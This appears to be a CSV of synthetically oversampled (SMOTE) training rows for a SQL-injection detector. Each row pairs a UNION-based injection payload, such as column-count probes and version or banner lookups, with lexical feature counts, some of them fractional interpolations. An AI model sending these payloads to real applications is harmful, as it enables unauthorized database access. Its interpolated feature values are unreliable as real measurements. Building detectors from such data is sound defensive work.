id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000279,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000078,1.1728084772933516,101.4796358122418,26.354233687463115,3.9911448189780825,62.0,4.645766312536889,26.479635812241796,8.354233687463115,0.6116125957348016,0.045981769190007904,0.2601460535466109,0.08225958152857957,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.7084673749262278,0.0,0.0,0.9999999999999996,5.645766312536885,0.0,0.0,1.0,0.0,0.0,1.0,0.35423368746311396,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000280,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000439,0.027582493109008566,34.05749193815801,19.019163979386004,3.868310448127807,14.0,8.038327958772008,8.0,4.019163979386003,0.4111728771071969,0.2359141287448413,0.2349559297755411,0.11795706437242065,0.009581989693002058,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.009581989693002058,3.0,0.009581989693001947,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"-5062""   )    )     )   union all select 4125,4125--",nearest_attack_euclidean,R000763,0.30748132266622763,51.05009238351656,21.189981523296687,3.681903955058588,14.0,12.0,17.240073906813244,7.810018476703311,0.2746721385559608,0.23543326161939498,0.3369812521485232,0.152913347676121,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.810018476703311,0.0,0.0,0.9999999999999996,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000259,0.1503961447339185,60.0,19.28329246230803,3.7918338698878573,14.0,32.0,4.0,10.0,0.23333333333333334,0.5333333333333333,0.06666666666666665,0.16666666666666666,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000316,0.0,64.0,21.0,3.789609031522995,14.0,36.0,4.0,10.0,0.21875,0.5625,0.0625,0.15625,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,0.9999999999999996,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000285,attack,union,"-7941%'  )   union all select 6965,6965,6965,6965--",nearest_attack_euclidean,R000506,0.6498348278903381,49.81140106389765,22.0,4.033747278529741,14.0,20.0,7.04912085111812,8.76228021277953,0.28160289220180434,0.40228984600257756,0.14024465255577276,0.17586260923984534,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.76228021277953,1.0,0.0,3.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.76228021277953,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000286,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000528,0.13517322088947725,39.0,21.579846598223487,4.212072557010789,14.0,16.0,4.0,5.0,0.358974358974359,0.41025641025641024,0.10256410256410257,0.1282051282051282,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000043,1.287594541580551,81.9352293877614,27.467614693880694,3.918060354113642,42.4676146938807,4.0,25.0,10.467614693880694,0.5183098551120568,0.048826280298818164,0.3051642518676135,0.1276996127215116,0.9352293877613903,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.9999999999999996,4.0,0.46761469388069515,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000288,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,0.16851702181168174,105.06274153737377,28.212548307474755,4.0476264715107515,29.0,44.85019322989901,15.0,16.212548307474755,0.276127425495427,0.426751893813078,0.14282453042866913,0.1542961502628259,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.212548307474754,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000289,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000522,0.4334487080098573,58.584330593708714,21.0,3.762493086800835,14.0,20.0,15.267464474966966,9.316866118741741,0.23933768299040126,0.3419109757005732,0.2597806583930943,0.1589706829159312,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.316866118741742,0.0,0.0,3.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,union," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000174,0.21922240363338966,98.09969585667031,26.0,4.06164571940582,62.900304143329706,4.099695856670298,23.099695856670298,8.0,0.641202738309223,0.04178225216728593,0.23546456289943027,0.08155044662406077,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.9999999999999996,5.099695856670299,0.0,0.0,1.0,0.900304143329701,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000291,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000530,0.5990031935910481,63.09722803124403,20.580554393751193,3.761509767239407,14.0,33.67778242499522,4.0,11.419445606248805,0.22221530242488416,0.533341637090139,0.06349008640710978,0.18095297407786706,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.4194456062488054,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000241,0.1901963034325921,79.36285370980619,25.27257074196124,3.9564386224386765,46.090282967844956,9.0,15.0,9.272570741961239,0.5803778634252079,0.11359765684903034,0.18932942808171724,0.11669505164404442,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.2725707419612386,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000293,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000127,0.0,87.0,27.0,3.808229182212671,42.0,5.0,29.0,11.0,0.4827586206896552,0.05747126436781608,0.3333333333333333,0.12643678160919541,0.0,1.0,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.9999999999999996,5.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000294,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,6.322389769870168,84.0,27.0,3.9211228013533774,46.0,3.0,25.0,10.0,0.5476190476190477,0.0357142857142857,0.2976190476190476,0.11904761904761904,0.0,1.0,2.0,0.0,1.0,1.0,0.31932470672298296,2.0,0.0,0.0,0.9999999999999996,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.31932470672298296,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000295,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000242,0.1397446630483881,78.95774501212637,27.895774501212635,4.162047581417674,44.166196009701096,9.0,15.0,10.791549002425272,0.5589637777197145,0.11417505265908262,0.19029175443180438,0.13656941518939855,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.791549002425273,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000296,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000725,0.2904475331175393,72.07034884795327,19.414069769590654,3.667769356295189,14.0,41.656279078362616,4.0,12.414069769590654,0.1944790697387913,0.57773820601281,0.05556544849679751,0.17221727575160126,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.414069769590654,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000606,0.21868439425162112,61.25588128625727,19.251176257251455,3.6738560606488644,14.0,33.00470502900582,4.0,10.251176257251455,0.22882504153651234,0.5384856668154144,0.06537858329614639,0.1673107083519268,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.251176257251455,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,union,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",nearest_attack_euclidean,R000202,0.8070318504515426,70.14418114745467,20.485581885254533,3.504952284926827,14.0,40.11534491796374,4.0,12.028836229490933,0.20061158234577123,0.5707296201762615,0.057317594955934636,0.1713412025220327,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.028836229490933,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,union," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,1.358958483032211,88.70747164739413,26.619501890173726,3.821379035912891,42.0,4.380498109826274,29.565977317915305,12.76099621965255,0.47655350268126956,0.04926868164814413,0.3302544044998914,0.14392341117069488,3.0,0.0,2.0,0.0,1.0,1.3804981098262752,0.0,2.760996219652551,0.0,0.0,0.9999999999999996,5.619501890173725,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000300,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000559,0.7500301919413335,94.92103654276772,28.47631096283032,4.058810280965075,25.0,35.93682923421418,22.0,11.984207308553545,0.26410823182564525,0.3774268290789677,0.2324152440065678,0.12604969508881933,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,4.984207308553545,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000301,attack,union,"-9256""   )    )    union all select 2977,2977,2977,2977,2977,2977,2977--",nearest_attack_euclidean,R000635,0.11949714954755722,72.86687263660079,20.0,3.581647581879651,14.0,32.693498109280625,14.0,12.173374527320156,0.19225537212979601,0.4484473195340873,0.19225537212979601,0.16704193620632068,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.173374527320156,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000302,attack,union,"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",nearest_attack_euclidean,R000551,0.009489012253376755,91.9253290173776,20.0,3.452815291763712,14.0,43.940263213902085,18.0,15.985065803475521,0.15230452195860988,0.4779847250017963,0.19582009966106986,0.17389065337852402,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,8.985065803475521,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000303,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000345,0.1825989443055591,105.56547990831677,31.547616073346575,4.380907174889401,37.0,36.452383926653425,17.0,15.113095981663356,0.35056945830236186,0.34520718922936844,0.16107245381459867,0.14315089865367106,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.113095981663356,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000304,attack,union,"-2518' union all select 6818,6818,6818,6818,6818,6818#",nearest_attack_euclidean,R000769,0.22913220583667485,53.29648268746075,19.85929653749215,3.7359060906423083,14.0,27.437186149968603,4.0,7.859296537492151,0.26490807415273243,0.512385519491319,0.07568802118649497,0.1470183851694535,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.859296537492151,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000305,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000431,0.417952984811614,63.46251352282496,21.794790539764588,3.8007794276211,14.0,28.820837840941653,9.23125676141248,11.410418920470827,0.22176618250178545,0.454776718989073,0.14359006383641626,0.17986703467272533,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.2052094602354133,1.0,0.0,5.205209460235413,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000183,0.8909221328603575,85.673158845582,24.884560769612,3.9770176307832243,25.0,32.461756921551995,18.653682308836004,9.557719615194,0.2918953241462028,0.3782073253604367,0.21840446351114126,0.11149288698221921,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.4422803848060004,0.0,0.0,4.115439230388,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000307,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000605,0.05004812832514134,61.7144728166175,20.0571054366765,3.642258527631843,14.0,19.771578253294003,18.0,9.9428945633235,0.2269375723167388,0.32018913281603795,0.2917768786929499,0.16109641617427334,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.9428945633235006,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000308,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000405,0.39233150160264985,41.45650062618632,21.0,4.128434739800019,14.0,17.96520050094905,4.0,5.491300125237263,0.33893297857423754,0.43201562326225634,0.0968379938783536,0.1322134042851525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.491300125237262,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000309,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,0.23715526255012126,76.00584141346013,23.0,3.824418701990602,14.0,36.0,13.14786406868011,12.857977344780018,0.1844004119130906,0.4741724877765186,0.1722270414656636,0.16920005884472722,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.8579773447800185,1.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,union,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",nearest_attack_euclidean,R000536,0.4444554253352811,85.45510295166793,22.508979409666413,3.7312290918731623,14.0,37.96408236133434,18.0,15.491020590333585,0.1642218627641727,0.44340395514065356,0.21114239498250775,0.18123178711266597,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,7.491020590333585,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000311,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000464,0.07789973380313012,105.57859160682702,27.115718321365403,4.16322943463569,29.0,44.46287328546161,15.0,17.115718321365406,0.274737735359482,0.4210513995041628,0.14210572518593892,0.16210513995041628,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.115718321365405,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000312,attack,union,"-6987' union all select 4721,4721--",nearest_attack_euclidean,R000615,0.06266139526202898,35.0,20.861518271748213,4.194595837128901,14.0,12.0,4.0,5.0,0.4,0.34285714285714286,0.11428571428571428,0.14285714285714285,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
